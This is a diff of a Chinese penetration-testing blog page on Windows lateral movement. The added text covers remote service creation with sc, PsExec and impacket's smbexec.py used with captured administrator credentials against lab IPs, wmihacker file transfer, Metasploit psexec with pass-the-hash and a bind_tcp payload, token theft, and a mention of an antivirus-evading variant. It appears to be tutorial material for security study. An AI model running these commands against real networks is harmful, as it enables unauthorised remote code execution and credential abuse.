@@ -44,6 +44,10 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208094339360.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208105838869.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208112303602.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322133436582.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322133717047.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322133939438.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322134226724.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208152502212.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208153009014.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208154152375.png">
@@ -59,7 +63,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208171736453.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208171844023.png">
 <meta property="article:published_time" content="2024-02-02T00:17:23.000Z">
-<meta property="article:modified_time" content="2024-03-21T14:31:31.084Z">
+<meta property="article:modified_time" content="2024-03-22T05:55:41.718Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -274,7 +278,7 @@
         
         
         
-          97 mins
+          100 mins
         
       </span>
     
@@ -471,7 +475,8 @@
 <li><p>sc远程注册服务</p>
 <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#sc远程创建服务</span><br><span class="hljs-comment">#本地系统启动</span><br>sc <span class="hljs-string">\\10.10.10.201</span> create test binpath= <span class="hljs-string">&quot;c:\59.exe&quot;</span> password= <span class="hljs-number">1qaz</span>@WSX3e<br>sc <span class="hljs-string">\\10.10.10.201</span> create test binpath(此处不能有空格)= (此处有空格)<span class="hljs-string">&quot;c:\59.exe&quot;</span> password= <span class="hljs-number">1qaz</span>@WSX3e<br><span class="hljs-comment"># =左边不能有空格，右边有一个空格</span><br><br><span class="hljs-comment">#当 &quot;de1ay\administrator&quot; 用户登录时启动</span><br>sc <span class="hljs-string">\\10.10.10.201</span> create test(服务名) binpath= <span class="hljs-string">&quot;c:\59.exe&quot;</span> obj= <span class="hljs-string">&quot;de1ay\administrator&quot;</span> password= <span class="hljs-number">1qaz</span>@WSX3e<br><br><span class="hljs-comment">#sc启动指定服务</span><br>sc <span class="hljs-string">\\10.10.10.201</span> start test<br><br><span class="hljs-comment">#sc停止指定服务</span><br>sc <span class="hljs-string">\\10.10.10.201</span> stop test<br>sc <span class="hljs-string">\\10.10.10.201</span> <span class="hljs-keyword">delete</span> test<br></code></pre></td></tr></table></figure></li>
 </ol>
-<h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><blockquote>
+<h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><p>没有回显，但是使用vmicexec 可以获取回显</p>
+<blockquote>
 <p>是用户管理本地和远程计算机的  一种模型。通过它可以访问、配置、管理和监视几乎所有的Windows资源。WMI的语法十分简单，基  本上常见的命名空间、对象等用几乎一模一样。它对应的是Windows里的WMI服务（winmgmt）。  </p>
 <p>在 windows 2000之后的操作系统中内置了该服务。WMI使用公共信息模型（CIM）表示托管组件，其  中包括系统、应用程序、网络等等。CIM中使用类表示管理对象，命名空间是一个类的集合。  </p>
 <p>通过使用135端口上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</p>
@@ -569,7 +574,10 @@
 <h1 id="外部工具篇"><a href="#外部工具篇" class="headerlink" title="外部工具篇"></a>外部工具篇</h1><h2 id="windwos工具简介"><a href="#windwos工具简介" class="headerlink" title="windwos工具简介"></a>windwos工具简介</h2><p><a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/SysinternalsSuite.zip">https://download.sysinternals.com/files/SysinternalsSuite.zip</a></p>
 <p>windwos tools 合集</p>
 <h3 id="Procmon"><a href="#Procmon" class="headerlink" title="Procmon"></a>Procmon</h3><p>主要是使用用于监控软件，做了什么操作，比如，写入文件，查询了注册表等操作</p>
-<h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><ol>
+<h2 id="Psexec-（两个版本）"><a href="#Psexec-（两个版本）" class="headerlink" title="Psexec （两个版本）"></a>Psexec （两个版本）</h2><p>这个工具有两个版本，第一个版本是微软自己的，第二个版本是impacket 里面的</p>
+<p>建议使用impacket</p>
+<p>impacket 又有两个版本，第一个是python版本，第二个是exe 版本</p>
+<ol>
 <li><p>简介</p>
 <blockquote>
 <p>  PsExec是一种轻巧的telnet替代品，可让您在其他系统上执行进程，并为控制台应用程序提供完整的  交互性，而无需手动安装客户端软件。  </p>
@@ -583,7 +591,7 @@
 </li>
 <li><p>通过CreateService创建服务  </p>
 </li>
-<li><p>获取服务句柄OpenService使用StartService启动服务</p>
+<li><p>获取服务句柄OpenService使用StartService启动服务（并且这个服务是真正的服务）</p>
 </li>
 </ul>
 </li>
@@ -595,9 +603,7 @@
 <li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用 户，连接域控只能用域管理员账户。</li>
 </ul>
 </li>
-<li><p>PsExec.exe使用</p>
-</li>
-</ol>
+<li><p>PsExec.exe使用  </p>
 <ul>
 <li><p>直接只用</p>
 <p>微软官方工具包 ，直接使用</p>
@@ -651,13 +657,25 @@
 <p>直接执行命令</p>
 </li>
 </ul>
-<h2 id="Smbexec-py"><a href="#Smbexec-py" class="headerlink" title="Smbexec.py"></a>Smbexec.py</h2><p>impacket套件  </p>
+</li>
+<li><p>实战使用</p>
+<p>如果获取了对方的密码（内网管理员用户可能都是一样的）</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322133436582.png" srcset="/img/loading.gif" lazyload alt="image-20240322133436582"></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">.\psexec.exe Administrator:<span class="hljs-string">&quot;passwd&quot;</span><span class="hljs-symbol">@192</span><span class="hljs-number">.168</span><span class="hljs-number">.79</span><span class="hljs-number">.170</span><br></code></pre></td></tr></table></figure>
+
+<p>本工具不用上传到靶机<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322133717047.png" srcset="/img/loading.gif" lazyload alt="image-20240322133717047"></p>
+<p>这个就是原理</p>
+<p>因此可以在服务管理器中发现</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322133939438.png" srcset="/img/loading.gif" lazyload alt="image-20240322133939438"></p>
+</li>
+</ol>
+<h2 id="Smbexec-py"><a href="#Smbexec-py" class="headerlink" title="Smbexec.py"></a>Smbexec.py</h2><p>和psexec 原理一致，但是更加高级</p>
+<p>impacket套件  </p>
 <p>smbexec是一款基于psexec的域渗透测试工具，并配套samba工具。  </p>
 <p>445端口</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\&gt;smbexec.py de1ay/administrator:<span class="hljs-number">1</span>qaz@WSX3e@<span class="hljs-number">10.10.10.201</span><br><span class="hljs-attribute">Impacket</span> v0.<span class="hljs-number">9</span>.<span class="hljs-number">17</span> - Copyright <span class="hljs-number">2019</span> SecureAuth Corporation<span class="hljs-meta"></span><br><span class="hljs-meta">[!] Launching semi-interactive shell - Careful what you execute</span><br></code></pre></td></tr></table></figure>
 
-
-
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240322134226724.png" srcset="/img/loading.gif" lazyload alt="image-20240322134226724"></p>
 <h2 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h2><ol>
 <li><p>wmiexec.vbs</p>
 <blockquote>
@@ -699,17 +717,21 @@
 
 <p>这个只是将结果导入到文件里面</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208162102933.png" srcset="/img/loading.gif" lazyload alt="image-20240208162102933"></p>
-<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">文件上传-复制本机calc.exe到远程主机c:\calc.exe<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">cscript wmihacker_0<span class="hljs-number">.4</span>.<span class="hljs-property">vbe</span> /upload <span class="hljs-number">172.16</span><span class="hljs-number">.94</span><span class="hljs-number">.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;c:\windows\system32\calc.exe&quot;</span> <span class="hljs-string">&quot;c:\calc&quot;</span></span><br><br>文件下载-下载远程主机calc.exe到本地c:\calc.exe<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">cscript wmihacker_0<span class="hljs-number">.4</span>.<span class="hljs-property">vbe</span> /download <span class="hljs-number">172.16</span><span class="hljs-number">.94</span><span class="hljs-number">.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;c:\calc&quot;</span><span class="hljs-string">&quot;c:\windows\system32\calc.exe&quot;</span></span><br><br></code></pre></td></tr></table></figure></li>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">文件上传-复制本机calc.exe到远程主机c:\calc.exe<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">cscript wmihacker_0<span class="hljs-number">.4</span>.<span class="hljs-property">vbe</span> /upload <span class="hljs-number">172.16</span><span class="hljs-number">.94</span><span class="hljs-number">.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;c:\windows\system32\calc.exe&quot;</span> <span class="hljs-string">&quot;c:\calc&quot;</span></span><br><br>文件下载-下载远程主机calc.exe到本地c:\calc.exe<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">cscript wmihacker_0<span class="hljs-number">.4</span>.<span class="hljs-property">vbe</span> /download <span class="hljs-number">172.16</span><span class="hljs-number">.94</span><span class="hljs-number">.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;c:\calc&quot;</span><span class="hljs-string">&quot;c:\windows\system32\calc.exe&quot;</span></span><br><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>免杀的版本</p>
+</li>
 </ol>
-<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Psexec-1"><a href="#Psexec-1" class="headerlink" title="Psexec"></a>Psexec</h3><p>执行直接就获取到meterpreter的PTH模块  </p>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>执行直接就获取到meterpreter的PTH模块  </p>
 <p>exploit&#x2F;windows&#x2F;smb&#x2F;psexec  </p>
 <p>设置</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> rhost<br><span class="hljs-built_in">set</span> smbuser<br><span class="hljs-built_in">set</span> smbpass<br><span class="hljs-built_in">set</span> lport  <br><span class="hljs-built_in">set</span> payload bind_tcp<br></code></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> rhost<br><span class="hljs-built_in">set</span> smbuser<br><span class="hljs-built_in">set</span> smbpass(可以是明文密码或者是hash 传递)<br><span class="hljs-built_in">set</span> lport  <br><span class="hljs-built_in">set</span> payload bind_tcp<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208164442538.png" srcset="/img/loading.gif" lazyload alt="image-20240208164442538"></p>
 <p>使用ms17_010</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208164648437.png" srcset="/img/loading.gif" lazyload alt="image-20240208164648437"></p>
-<h3 id="Token窃取"><a href="#Token窃取" class="headerlink" title="Token窃取"></a>Token窃取</h3><p>  Windows有两种类型的Token：  </p>
+<h3 id="Token窃取"><a href="#Token窃取" class="headerlink" title="Token窃取"></a>Token窃取</h3><p>由于system 不能开启文件共享服务，所以我们需要降权为本地用户</p>
+<p>  Windows有两种类型的Token：  </p>
 <blockquote>
 <p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)  </p>
 <p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)  </p>
